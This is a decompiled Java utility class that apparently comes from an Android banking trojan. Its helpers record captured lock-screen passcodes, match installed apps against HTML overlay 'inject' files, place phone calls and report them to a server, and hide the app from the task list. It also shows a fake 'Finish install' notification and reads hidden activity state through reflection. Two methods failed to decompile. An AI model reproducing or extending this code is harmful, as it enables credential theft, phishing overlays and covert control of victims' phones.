/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.ActivityManager
 *  android.app.ActivityManager$AppTask
 *  android.app.AppOpsManager
 *  android.app.KeyguardManager
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.role.RoleManager
 *  android.content.ClipData
 *  android.content.ClipDescription
 *  android.content.ClipboardManager
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageInfo
 *  android.content.pm.PackageManager
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.content.pm.ResolveInfo
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.Canvas
 *  android.graphics.ColorFilter
 *  android.graphics.ColorMatrix
 *  android.graphics.ColorMatrixColorFilter
 *  android.graphics.Matrix
 *  android.graphics.Paint
 *  android.graphics.Point
 *  android.graphics.drawable.AdaptiveIconDrawable
 *  android.graphics.drawable.BitmapDrawable
 *  android.graphics.drawable.Drawable
 *  android.graphics.drawable.GradientDrawable
 *  android.media.MediaMetadataRetriever
 *  android.net.ConnectivityManager
 *  android.net.Uri
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.os.Process
 *  android.os.VibrationEffect
 *  android.os.Vibrator
 *  android.provider.Settings$Secure
 *  android.provider.Telephony$Sms
 *  android.telecom.TelecomManager
 *  android.telephony.SubscriptionInfo
 *  android.telephony.SubscriptionManager
 *  android.telephony.TelephonyManager
 *  android.text.Layout$Alignment
 *  android.text.StaticLayout
 *  android.text.TextPaint
 *  android.util.Base64
 *  android.view.View
 *  android.widget.TextView
 *  android.widget.Toast
 *  okhttp3.OkHttpClient
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.KeyguardManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.role.RoleManager;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.ColorFilter;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.Matrix;
import android.graphics.Paint;
import android.graphics.Point;
import android.graphics.drawable.AdaptiveIconDrawable;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.media.MediaMetadataRetriever;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.provider.Telephony;
import android.telecom.TelecomManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.util.Base64;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.lang.reflect.AnnotatedElement;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import linker.resourcer.encoder.Backworker;
import linker.resourcer.encoder.PersistentDreamService;
import linker.resourcer.encoder.R;
import linker.resourcer.encoder.AlertDialogActivity;
import linker.resourcer.encoder.SplashActivity;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.UtilityHelper$$ExternalSyntheticBackport0;
import linker.resourcer.encoder.UtilityHelper$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.UtilityHelper$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.SystemUtilities;
import linker.resourcer.encoder.SharedPreferencesManager;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class UtilityHelper {
    private static String Lastbaseimg;
    private static boolean alreadyhide;
    private static String clipdata;
    private static final Map<String, Boolean> launcherCache;
    private static int notifiid;
    private static PackageManager pmg;
    static Random rand;
    private static Random randomidx;
    private static final Map<String, Boolean> systemAppCache;

    static {
        alreadyhide = false;
        notifiid = 415;
        randomidx = null;
        systemAppCache = new ConcurrentHashMap<String, Boolean>();
        launcherCache = new ConcurrentHashMap<String, Boolean>();
        clipdata = "";
    }

    public static Bitmap BITMAP_RESIZER(Bitmap bitmap, int n, int n2) {
        Bitmap bitmap2 = Bitmap.createBitmap((int)n, (int)n2, (Bitmap.Config)bitmap.getConfig());
        float f = (float)n / (float)bitmap.getWidth();
        float f2 = (float)n2 / (float)bitmap.getHeight();
        Matrix matrix = new Matrix();
        matrix.setScale(f, f2, 0.0f, 0.0f);
        Canvas canvas = new Canvas(bitmap2);
        canvas.setMatrix(matrix);
        matrix = new Paint(2);
        matrix.setAntiAlias(true);
        matrix.setDither(true);
        matrix.setFilterBitmap(true);
        canvas.drawBitmap(bitmap, 0.0f, 0.0f, (Paint)matrix);
        return bitmap2;
    }

    public static void BrodcastAlert(Context context, String string2, String string3, int n, String string4, String string5) {
        try {
            Intent intent = new Intent(context, AlertDialogActivity.class);
            intent.putExtra("Title", string2);
            intent.putExtra("Msg", string3);
            SharedPreferencesManager.Write(context, "alert_ico", string5);
            intent.putExtra("Type", n);
            intent.putExtra("toopen", string4);
            intent.addFlags(0x10000000);
            context.startActivity(intent);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Exception decompiling
     */
    public static void BrodcastNotification(Context var0, String var1_2, String var2_3, int var3_4, String var4_5) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Back jump on a try block [egrp 2[TRYBLOCK] [6 : 211->219)] java.lang.Exception
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.insertExceptionBlocks(Op02WithProcessedDataAndRefs.java:2283)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:415)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public static String Checkallject(Context context, String string2) {
        PackageManager packageManager = context.getPackageManager();
        ArrayList<String> arrayList = new ArrayList<String>();
        Iterator iterator2 = packageManager.getInstalledPackages(0).iterator();
        while (iterator2.hasNext()) {
            ApplicationInfo applicationInfo = ((PackageInfo)iterator2.next()).applicationInfo;
            String string3 = applicationInfo.packageName;
            if ((applicationInfo.flags & 1) != 0 || !string2.contains(string3) || packageManager.getLaunchIntentForPackage(string3) == null) continue;
            if (UtilityHelper.findjectfile(context, string3).equals("notfound")) {
                arrayList.add(string3);
                continue;
            }
            if (AccessibilityServiceHelper.ject_list.contains(string3)) continue;
            AccessibilityServiceHelper.ject_list.add(string3);
        }
        if (arrayList.isEmpty()) {
            return "empty";
        }
        return UtilityHelper$$ExternalSyntheticBackport0.m("<j>", arrayList);
    }

    public static void Clearpasscodes(Context context) {
        SharedPreferencesManager.Write(context, ConfigurationConstants.lock_cods, "");
    }

    public static String Create_DevicID() {
        CharSequence charSequence = "16" + Build.BOARD.length() % 10 + Build.BRAND.length() % 10 + Build.DEVICE.length() % 10 + Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 + Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 + Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 + Build.TAGS.length() % 10 + Build.TYPE.length() % 10 + Build.USER.length() % 10;
        Object object = MessageDigest.getInstance("MD5");
        ((MessageDigest)object).update(((String)charSequence).getBytes());
        object = ((MessageDigest)object).digest();
        charSequence = new StringBuilder();
        int n = ((Object)object).length;
        for (int i = 0; i < n; ++i) {
            ((StringBuilder)charSequence).append(String.format("%02X", (byte)object[i]));
            continue;
        }
        try {
            object = ((StringBuilder)charSequence).toString().replaceAll("[^0-9]", "");
            return object;
        }
        catch (Exception exception) {
            return UUID.randomUUID().toString().replaceAll("[^0-9]", "");
        }
    }

    public static void CustomToast(Context context, String object, String string2, int n) {
        Toast toast = new Toast(context.getApplicationContext());
        TextView textView = new TextView(context);
        textView.setText((CharSequence)object);
        textView.setTextColor(-16777216);
        textView.setTextSize(14.0f);
        textView.setPadding(24, 16, 24, 16);
        textView.setGravity(17);
        textView.setTextAlignment(4);
        try {
            object = Base64.decode((String)string2, (int)0);
            string2 = BitmapFactory.decodeByteArray((byte[])object, (int)0, (int)((Object)object).length);
            object = new BitmapDrawable(context.getResources(), (Bitmap)string2);
            object.setBounds(0, 0, string2.getWidth(), string2.getHeight());
            textView.setCompoundDrawables((Drawable)object, null, null, null);
            textView.setCompoundDrawablePadding(12);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        context = new GradientDrawable();
        context.setColor(-3355444);
        context.setCornerRadius(20.0f);
        context.setStroke(1, -12303292);
        textView.setBackground((Drawable)context);
        toast.setView((View)textView);
        toast.setDuration(n);
        toast.show();
    }

    public static String Fix_it(String string2, String string3) {
        if (string2.length() > 0 && string3.length() > 0 && string2.contains(string3)) {
            return string2.replace(string3, "");
        }
        return string2;
    }

    public static String FullStamp() {
        return new SimpleDateFormat("yyyy/MM/dd hh:mm:ss").format(new Date());
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public static String Get_Network(Context context) {
        if ((context = ((ConnectivityManager)context.getSystemService("connectivity")).getActiveNetworkInfo()) == null || !context.isConnected()) return "Unknown";
        if (context.getType() == 1) {
            return "WIFI";
        }
        if (context.getType() == 17) {
            return "VPN";
        }
        if (context.getType() != 0) return "Unknown";
        if (context.getSubtype() == 1 || context.getSubtype() == 2 || context.getSubtype() == 7 || context.getSubtype() == 11 || context.getSubtype() == 16 || context.getSubtype() == 4) return "2G";
        if (context.getSubtype() == 3 || context.getSubtype() == 5 || context.getSubtype() == 6 || context.getSubtype() == 8 || context.getSubtype() == 9 || context.getSubtype() == 10 || context.getSubtype() == 14 || context.getSubtype() == 15 || context.getSubtype() == 12 || context.getSubtype() == 17) return "3G";
        if (context.getSubtype() == 13 || context.getSubtype() == 19 || context.getSubtype() == 18) return "4G";
        if (context.getSubtype() != 20) return "Unknown";
        return "5G";
    }

    public static boolean IsIgnore_Battery(Context context) {
        return ((PowerManager)context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public static boolean IsScreenOn(Context context) {
        boolean bl = ((PowerManager)context.getSystemService("power")).isInteractive();
        return bl;
    }

    public static void NotifyFor(Context context, Class object) {
        object = new Intent(context, (Class)object);
        object.setFlags(0x10000000);
        object = PendingIntent.getActivity((Context)context, (int)0, (Intent)object, (int)0xC000000);
        object = new NotificationCompat.Builder(context, "Importants").setContentTitle("Finish install").setContentText("Tap to complete").setSmallIcon(R.drawable.notify).setContentIntent((PendingIntent)object).setOngoing(false).setVisibility(1).setPriority(2).setAutoCancel(true);
        context = (NotificationManager)context.getSystemService("notification");
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel("Importants", (CharSequence)"update", 4);
            notificationChannel.setDescription(ConfigurationProvider._Notfy_MSG_);
            notificationChannel.setShowBadge(false);
            if (Build.VERSION.SDK_INT >= 29) {
                notificationChannel.setAllowBubbles(false);
            }
            context.createNotificationChannel(notificationChannel);
        }
        context.notify(101, ((NotificationCompat.Builder)object).build());
    }

    public static void OpenSettingsPage(Context context) {
        try {
            Intent intent = new Intent("android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS");
            intent.addCategory("android.intent.category.DEFAULT");
            intent.addFlags(0x10000000);
            intent.addFlags(32768);
            intent.addFlags(0x4000000);
            intent.addFlags(0x40000000);
            intent.addFlags(0x800000);
            context = PendingIntent.getActivity((Context)context, (int)0, (Intent)intent, (int)0xC000000);
            context.send();
            context.cancel();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static String Safeurl(String string2) {
        if (string2 != null && !string2.trim().isEmpty()) {
            String string3 = string2.toLowerCase(Locale.ROOT).trim();
            String string4 = string2;
            if (!string3.startsWith("https://")) {
                string4 = string2;
                if (!string3.startsWith("http://")) {
                    string4 = "http://" + string2.trim();
                }
            }
            return string4;
        }
        return "";
    }

    public static String ScreenStatus(Context object) {
        try {
            KeyguardManager keyguardManager = (KeyguardManager)object.getSystemService("keyguard");
            boolean bl = ((PowerManager)object.getSystemService("power")).isScreenOn();
            object = keyguardManager.isDeviceLocked() ? (bl ? "0" : "1") : (bl ? "2" : "3");
            return object;
        }
        catch (Exception exception) {
            return "-1";
        }
    }

    public static void ServiceStarter(Context context, Class<?> clazz) {
        Intent intent = new Intent(context, clazz);
        if (!SystemUtilities.isServiceRunning(context, clazz)) {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }
    }

    public static void StorePasscode(Context context, String string2) {
        String string3 = SharedPreferencesManager.Read(context, ConfigurationConstants.lock_cods, "");
        String string4 = SharedPreferencesManager.Read(context, ConfigurationConstants.lock_type, "1");
        string2 = string3 + string2 + "|" + string4 + "*";
        SharedPreferencesManager.Write(context, ConfigurationConstants.lock_cods, string2);
    }

    public static String Version() {
        int n = Build.VERSION.SDK_INT;
        String string2 = "Unknown";
        switch (n) {
            default: {
                if (n <= 35) break;
                string2 = "Android " + n;
                break;
            }
            case 36: {
                string2 = "Android 16";
                break;
            }
            case 35: {
                string2 = "Android 15";
                break;
            }
            case 34: {
                string2 = "Android 14";
                break;
            }
            case 33: {
                string2 = "Android 13";
                break;
            }
            case 32: {
                string2 = "Android 12L";
                break;
            }
            case 31: {
                string2 = "Android 12";
                break;
            }
            case 30: {
                string2 = "Android 11";
                break;
            }
            case 29: {
                string2 = "Android 10";
                break;
            }
            case 28: {
                string2 = "Pie";
                break;
            }
            case 27: {
                string2 = "Oreo 8.1";
                break;
            }
            case 26: {
                string2 = "Oreo";
                break;
            }
            case 25: {
                string2 = "Nougat 7.1";
                break;
            }
            case 24: {
                string2 = "Nougat";
            }
        }
        return string2;
    }

    /*
     * Exception decompiling
     */
    public static String Wallpaper(Context var0, int var1_8, int var2_9, boolean var3_10) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Started 5 blocks at once
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.getStartingBlocks(Op04StructuredStatement.java:412)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:487)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    static /* synthetic */ String access$002(String string2) {
        clipdata = string2;
        return string2;
    }

    public static String apkhandler(Context object) {
        Intent intent = new Intent("android.intent.action.GET_CONTENT");
        intent.setType("application/vnd.android.package-archive");
        object = object.getPackageManager().queryIntentActivities(intent, 65536).iterator();
        if (object.hasNext()) {
            return ((ResolveInfo)object.next()).activityInfo.packageName;
        }
        return null;
    }

    private static String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)byteArrayOutputStream);
        return Base64.encodeToString((byte[])byteArrayOutputStream.toByteArray(), (int)0);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String calculateMD5(File object) throws Exception {
        int n;
        int n2;
        Object object2 = MessageDigest.getInstance("MD5");
        object = new FileInputStream((File)object);
        byte[] byArray = new byte[1024];
        while (true) {
            n2 = ((InputStream)object).read(byArray);
            n = 0;
            if (n2 <= 0) break;
            ((MessageDigest)object2).update(byArray, 0, n2);
        }
        object = ((MessageDigest)object2).digest();
        object2 = new StringBuilder();
        n2 = ((Object)object).length;
        while (true) {
            if (n >= n2) {
                return ((StringBuilder)object2).toString();
            }
            ((StringBuilder)object2).append(String.format("%02x", (byte)object[n]));
            ++n;
        }
        finally {
            ((InputStream)object).close();
        }
    }

    public static void callphone(Context context, String string2) {
        try {
            StringBuilder stringBuilder = new StringBuilder();
            Object object = new Intent("android.intent.action.CALL", Uri.parse((String)stringBuilder.append("tel:").append(string2).toString()));
            object.setClassName("com.android.phone", "com.android.phone.OutgoingCallBroadcaster");
            object.setFlags(0x4000000);
            object.setFlags(0x10000000);
            context.startActivity((Intent)object);
            object = new StringBuilder();
            WorkerService.MyWorker.AlertServer(context, "Call phone", ((StringBuilder)object).append("Calling: ").append(string2).toString());
        }
        catch (Exception exception) {
            try {
                Intent intent = new Intent("android.intent.action.CALL");
                StringBuilder stringBuilder = new StringBuilder();
                intent.setData(Uri.parse((String)stringBuilder.append("tel:").append(string2).toString()));
                intent.setFlags(0x4000000);
                intent.setFlags(0x10000000);
                context.startActivity(intent);
                stringBuilder = new StringBuilder();
                WorkerService.MyWorker.AlertServer(context, "Call phone", stringBuilder.append("Calling: ").append(string2).toString());
            }
            catch (Exception exception2) {
                // empty catch block
            }
        }
    }

    public static Bitmap changeImageOpacity(Bitmap bitmap, float f) {
        Bitmap bitmap2 = Bitmap.createBitmap((int)bitmap.getWidth(), (int)bitmap.getHeight(), (Bitmap.Config)bitmap.getConfig());
        Canvas canvas = new Canvas(bitmap2);
        Paint paint = new Paint();
        paint.setAlpha((int)(255.0f * f));
        f = 1.0f - 1.0f;
        paint.setColorFilter((ColorFilter)new ColorMatrixColorFilter(new ColorMatrix(new float[]{50.0f, 0.0f, 0.0f, 0.0f, f, 0.0f, 50.0f, 0.0f, 0.0f, f, 0.0f, 0.0f, 50.0f, 0.0f, f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f})));
        canvas.drawBitmap(bitmap, 0.0f, 0.0f, paint);
        return bitmap2;
    }

    public static Bitmap convertToBitmap(Drawable drawable2, int n, int n2) {
        Bitmap bitmap = Bitmap.createBitmap((int)n, (int)n2, (Bitmap.Config)Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable2.setBounds(0, 0, n, n2);
        drawable2.draw(canvas);
        return bitmap;
    }

    public static byte[] createImageByts(String object) {
        Bitmap bitmap = Bitmap.createBitmap((int)350, (int)650, (Bitmap.Config)Bitmap.Config.ARGB_8888);
        Object object2 = new Canvas(bitmap);
        object2.drawColor(-16777216);
        TextPaint textPaint = new TextPaint();
        textPaint.setColor(-1);
        textPaint.setTextSize(45.0f);
        textPaint.setAntiAlias(true);
        object = new StaticLayout((CharSequence)object, textPaint, object2.getWidth() - 40, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false);
        float f = (float)(object2.getHeight() - object.getHeight()) / 2.0f;
        object2.save();
        object2.translate(20.0f, f);
        object.draw((Canvas)object2);
        object2.restore();
        object2 = new ByteArrayOutputStream();
        try {
            bitmap.compress(Bitmap.CompressFormat.WEBP, 70, (OutputStream)object2);
            object = ((ByteArrayOutputStream)object2).toByteArray();
            return object;
        }
        finally {
            bitmap.recycle();
            try {
                ((ByteArrayOutputStream)object2).close();
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
        }
    }

    public static void deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] fileArray = file.listFiles();
            int n = fileArray.length;
            for (int i = 0; i < n; ++i) {
                UtilityHelper.deleteRecursive(fileArray[i]);
            }
        }
        file.delete();
    }

    public static Bitmap drawableToBitmap(Drawable drawable2) {
        BitmapDrawable bitmapDrawable;
        Bitmap bitmap;
        Bitmap bitmap2;
        block15: {
            block14: {
                block13: {
                    bitmap = bitmap2 = null;
                    if (!(drawable2 instanceof BitmapDrawable)) break block13;
                    bitmap = bitmap2;
                    bitmapDrawable = (BitmapDrawable)drawable2;
                    bitmap = bitmap2;
                    if (bitmapDrawable.getBitmap() == null) break block13;
                    bitmap = bitmap2;
                    return bitmapDrawable.getBitmap();
                }
                bitmap = bitmap2;
                if (drawable2.getIntrinsicWidth() <= 0) break block14;
                bitmap = bitmap2;
                if (drawable2.getIntrinsicHeight() <= 0) break block14;
                bitmap = bitmap2;
                bitmap2 = Bitmap.createBitmap((int)drawable2.getIntrinsicWidth(), (int)drawable2.getIntrinsicHeight(), (Bitmap.Config)Bitmap.Config.ARGB_8888);
                break block15;
            }
            bitmap = bitmap2;
            bitmap2 = Bitmap.createBitmap((int)1, (int)1, (Bitmap.Config)Bitmap.Config.ARGB_8888);
        }
        bitmap = bitmap2;
        bitmap = bitmap2;
        bitmapDrawable = new Canvas(bitmap2);
        bitmap = bitmap2;
        drawable2.setBounds(0, 0, bitmapDrawable.getWidth(), bitmapDrawable.getHeight());
        bitmap = bitmap2;
        try {
            drawable2.draw((Canvas)bitmapDrawable);
        }
        catch (Exception exception) {
            bitmap2 = bitmap;
        }
        return bitmap2;
    }

    public static void excludeFromTaskList(Context context) {
        try {
            if (ConfigurationProvider.Is_Store.equals("1")) {
                return;
            }
            Handler handler = new Handler(context.getMainLooper());
            UtilityHelper$$ExternalSyntheticLambda1 UtilityHelper$$ExternalSyntheticLambda1 = new UtilityHelper$$ExternalSyntheticLambda1(context);
            handler.postDelayed((Runnable)UtilityHelper$$ExternalSyntheticLambda1, 1000L);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static String findjectfile(Context object, String string2) {
        if (new File(object.getFilesDir(), "protected/" + string2 + "/index.html").exists()) {
            return "protected/" + string2 + "/index.html";
        }
        if (new File(object.getFilesDir(), "protected/" + string2 + "/" + string2 + ".html").exists()) {
            return "protected/" + string2 + "/" + string2 + ".html";
        }
        if (((File)(object = new File(object.getFilesDir(), "protected/" + string2))).exists() && ((File)object).isDirectory() && (object = ((File)object).listFiles(new FilenameFilter(){

            @Override
            public boolean accept(File file, String string2) {
                return string2.toLowerCase().endsWith(".html");
            }
        })) != null && ((Object)object).length > 0) {
            return "protected/" + string2 + "/" + ((File)object[0]).getName();
        }
        return "notfound";
    }

    public static String fromBase64(String string2) {
        Object object = Base64.decode((String)string2, (int)0);
        try {
            object = new String((byte[])object, "UTF-8");
            return object;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return string2;
        }
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String getAppIconAsBase64(Context object) {
        try {
            if (Lastbaseimg != null && Lastbaseimg.length() > 0) {
                return Lastbaseimg;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            void var0_5;
            Object object2 = object.getPackageManager().getApplicationIcon(object.getApplicationInfo());
            if (object2 instanceof BitmapDrawable) {
                Bitmap bitmap = ((BitmapDrawable)object2).getBitmap();
            } else if (Build.VERSION.SDK_INT >= 26 && object2 instanceof AdaptiveIconDrawable) {
                AdaptiveIconDrawable adaptiveIconDrawable = (AdaptiveIconDrawable)object2;
                Drawable drawable2 = adaptiveIconDrawable.getBackground();
                Drawable drawable3 = adaptiveIconDrawable.getForeground();
                int n = Math.max(object2.getIntrinsicWidth(), object2.getIntrinsicHeight());
                Bitmap bitmap = Bitmap.createBitmap((int)n, (int)n, (Bitmap.Config)Bitmap.Config.ARGB_8888);
                object2 = new Canvas(bitmap);
                if (drawable2 != null) {
                    drawable2.setBounds(0, 0, n, n);
                }
                if (drawable3 != null) {
                    drawable3.setBounds(0, 0, n, n);
                }
                if (drawable2 != null) {
                    drawable2.draw((Canvas)object2);
                }
                if (drawable3 != null) {
                    drawable3.draw((Canvas)object2);
                }
            } else {
                int n = object2.getIntrinsicWidth();
                int n2 = 96;
                n = n > 0 ? object2.getIntrinsicWidth() : 96;
                if (object2.getIntrinsicHeight() > 0) {
                    n2 = object2.getIntrinsicHeight();
                }
                Bitmap bitmap = Bitmap.createBitmap((int)n, (int)n2, (Bitmap.Config)Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                object2.setBounds(0, 0, n, n2);
                object2.draw(canvas);
            }
            object2 = new ByteArrayOutputStream();
            var0_5.compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)object2);
            Lastbaseimg = Base64.encodeToString((byte[])((ByteArrayOutputStream)object2).toByteArray(), (int)0);
            return Lastbaseimg;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return "";
        }
    }

    public static String getAppIconAsBase64(Context object, String string2) {
        try {
            object = object.getPackageManager();
            object = UtilityHelper.bitmapToBase64(UtilityHelper.drawableToBitmap(object.getApplicationIcon(object.getApplicationInfo(string2, 0))));
            return object;
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            nameNotFoundException.printStackTrace();
            return null;
        }
    }

    public static String getAppNameFromPkgName(Context object, String string2) {
        try {
            if (pmg == null) {
                pmg = object.getPackageManager();
            }
            object = pmg.getApplicationInfo(string2, 0);
            object = ((Object)pmg.getApplicationLabel((ApplicationInfo)object)).toString();
            return object;
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            return "";
        }
    }

    public static String getBatteryPercentage(Context context) {
        context = context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        return String.valueOf(context.getIntExtra("level", 0) * 100 / context.getIntExtra("scale", 100));
    }

    public static Activity getCurrentActivity() {
        try {
            AnnotatedElement annotatedElement = Class.forName("android.app.ActivityThread");
            Object object2 = ((Class)annotatedElement).getMethod("currentActivityThread", new Class[0]).invoke(null, new Object[0]);
            annotatedElement = ((Class)annotatedElement).getDeclaredField("mActivities");
            ((Field)annotatedElement).setAccessible(true);
            for (Object object2 : ((Map)((Field)annotatedElement).get(object2)).values()) {
                Class<?> clazz = object2.getClass();
                annotatedElement = clazz.getDeclaredField("paused");
                ((Field)annotatedElement).setAccessible(true);
                if (((Boolean)((Field)annotatedElement).get(object2)).booleanValue()) continue;
                annotatedElement = clazz.getDeclaredField("activity");
                ((Field)annotatedElement).setAccessible(true);
                object2 = (Activity)((Field)annotatedElement).get(object2);
                return object2;
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        return null;
    }

